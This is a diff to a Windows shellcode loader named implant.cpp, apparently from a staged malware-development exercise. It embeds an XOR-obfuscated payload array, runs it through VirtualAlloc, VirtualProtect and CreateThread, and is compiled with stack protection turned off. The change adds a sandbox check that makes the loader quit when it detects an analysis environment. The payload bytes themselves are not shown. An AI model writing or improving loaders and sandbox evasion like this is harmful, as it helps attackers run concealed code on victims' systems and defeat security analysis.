@@ -1,5 +1,5 @@
 /// Compile With:
-/// cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /I "headers" /link /OUT:executables\level1.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 
+/// cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /I "headers" /link /OUT:executables\level2.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -7,6 +7,7 @@
 
 /// User defined headers
 #include "obfuscators.h"
+#include "sandbox.h"
 
 // Payload String - Level 1
 unsigned char payload[] = {
@@ -46,17 +47,23 @@ unsigned int xor_key_len = (int)(sizeof(XOR_KEY)/sizeof(XOR_KEY[0]))-1;
 /// Main Function
 ///
 /// Returns
-///  0 - OK
-/// -1 - VirtualAlloc() failed
-/// -2 - VirtualProtect() failed
-/// -3 - CreateThread() failed
-/// -4 - WaitForSingleObject() failed
+///   0 - OK
+///  -1 - VirtualAlloc() failed
+///  -2 - VirtualProtect() failed
+///  -3 - CreateThread() failed
+///  -4 - WaitForSingleObject() failed
+/// -99 - Sandbox check failed
 int main(void){
     BOOL rv;
     HANDLE th;
     DWORD _event = 0;
     void * exec_mem;
     DWORD oldprotect = 0;
+
+    // Check for sandbox
+    if (check_sandbox() != 0) {
+        return -99;
+    }
 
     // Allocate a memory buffer for payload
     exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
